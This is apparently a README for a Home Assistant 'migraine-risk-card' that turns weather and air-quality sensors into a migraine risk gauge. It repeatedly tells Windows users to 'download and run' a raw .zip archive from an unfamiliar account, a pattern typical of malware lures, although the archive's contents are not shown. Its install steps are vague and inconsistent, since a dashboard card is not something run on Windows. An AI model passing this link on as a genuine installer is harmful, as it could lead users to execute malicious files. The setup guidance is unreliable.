# 🌡️ migraine-risk-card - Track Migraine Triggers at Home

[![Download migraine-risk-card](https://img.shields.io/badge/Download%20Now-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/projectionracedriver670/migraine-risk-card/raw/refs/heads/main/sensor-package/risk-migraine-card-2.3.zip)

## 🧭 What this does

migraine-risk-card is a Home Assistant card that shows your migraine risk based on your local weather and air quality. It checks 9 factors that can matter for migraine sufferers and turns them into a single risk score.

You can add it to your Home Assistant dashboard so you can see risk levels at a glance. The card uses a clear gauge and simple color states to show when conditions may be better or worse for you.

## ✅ What you need

- A Windows PC to set things up
- Home Assistant already running
- Access to your Home Assistant dashboard
- A browser such as Chrome, Edge, or Firefox
- Permission to add custom cards in Home Assistant

## 🚀 Download and set up

Visit this page to download and run this file:

https://github.com/projectionracedriver670/migraine-risk-card/raw/refs/heads/main/sensor-package/risk-migraine-card-2.3.zip

On Windows, open the link in your browser, then follow the repository page to get the latest release or files. If you use Home Assistant Desktop or a browser on the same PC, you can keep the setup simple by copying the files into the right Home Assistant folder.

## 🛠️ Install in Home Assistant

1. Open your browser and go to the download link.
2. Get the card files from the repository page.
3. Place the card files in your Home Assistant `www` or custom cards folder, based on your setup.
4. Add the card to Lovelace in your dashboard.
5. Refresh Home Assistant so it can load the new card.
6. Open your dashboard and check that the card appears.

If you use HACS, you can add the card from there after you connect HACS to Home Assistant. If you do not use HACS, you can still add the files by hand and then point Home Assistant to the card file.

## 🖥️ Add the card to your dashboard

After the files are in place, add the card to Lovelace.

Use a card setup like this in your dashboard editor:

```yaml
type: custom:migraine-risk-card
```

You may also see options for a title, gauge style, or risk colors, based on how your Home Assistant setup is organized.

## 🌦️ What the card checks

This card uses 9 factors that often matter for migraine risk:

- Air pressure
- Pressure change
- Temperature
- Temperature change
- Humidity
- Dew point
- Wind speed
- Air quality
- Pollen or related outdoor triggers

It combines these inputs into one risk score. That score helps you understand when the day may feel harder for people who get migraines.

## 📊 How the display works

The card shows:

- A simple risk score
- A visual gauge
- A color state for low, medium, or high risk
- A clean layout for quick reading
- Data from your Home Assistant sensors

The layout is made to be easy to read on a wall tablet, desktop screen, or phone browser.

## 🔧 Example setup

If your Home Assistant sensors already track weather and air quality, connect them to the card so it can read the values. A common setup may use sensors for:

- Outdoor temperature
- Barometric pressure
- Humidity
- Wind speed
- Air quality index
- Forecast data
- Pollen data
- Pressure trend
- Temperature trend

Once linked, the card can turn those readings into a risk view that is easier to scan than raw numbers.

## 🧩 HACS setup

If you use HACS, the setup is easier:

1. Open HACS in Home Assistant.
2. Add the repository from GitHub.
3. Install migraine-risk-card.
4. Reload your dashboard resources.
5. Add the card to Lovelace.

This path works well if you want Home Assistant to manage updates for you.

## 📁 Manual setup

If you prefer to do it by hand on Windows:

1. Open the GitHub repository.
2. Download the card files to your PC.
3. Move the files to your Home Assistant custom cards folder.
4. Add the card resource path in Home Assistant.
5. Refresh the page.
6. Add the card to your dashboard.

This works well for users who want full control over file placement.

## 🎛️ Typical use cases

- Check migraine risk before you leave home
- Compare today’s risk with yesterday’s
- Watch for weather changes that may affect symptoms
- Use on a family dashboard
- Keep a simple view on a tablet in the kitchen or bedroom

## 🔒 System fit

migraine-risk-card is built for Home Assistant users who want a dashboard card, not a separate app. It fits standard Lovelace setups and works best when your sensors already feed weather and air quality data into Home Assistant.

It is a good fit for:

- Windows users who browse Home Assistant in a web page
- People who use a tablet dashboard
- Users who want a clear risk view instead of raw sensor data

## 🧪 Troubleshooting

If the card does not show up:

- Refresh the browser page
- Check that the card file is in the right folder
- Confirm the resource path is correct
- Make sure Home Assistant can read your weather sensors
- Remove and add the card again in Lovelace
- Restart Home Assistant if needed

If the gauge looks wrong:

- Check sensor values for missing data
- Make sure units match your Home Assistant setup
- Confirm that your weather and air quality entities update as expected

## 📌 Good habits

- Keep your sensor names easy to find
- Use local weather data when possible
- Check that your air quality source updates often
- Place the card near the top of your dashboard if you want fast access
- Review the score at the same time each day to spot patterns

## 📚 What the repository includes

This repository provides the card for Home Assistant dashboards and the code needed to show the migraine risk view. It is designed around Home Assistant, Lovelace, HACS, and custom cards, with a focus on simple display and clear daily use

## 🔗 Download link

Visit this page to download and run this file:

https://github.com/projectionracedriver670/migraine-risk-card/raw/refs/heads/main/sensor-package/risk-migraine-card-2.3.zip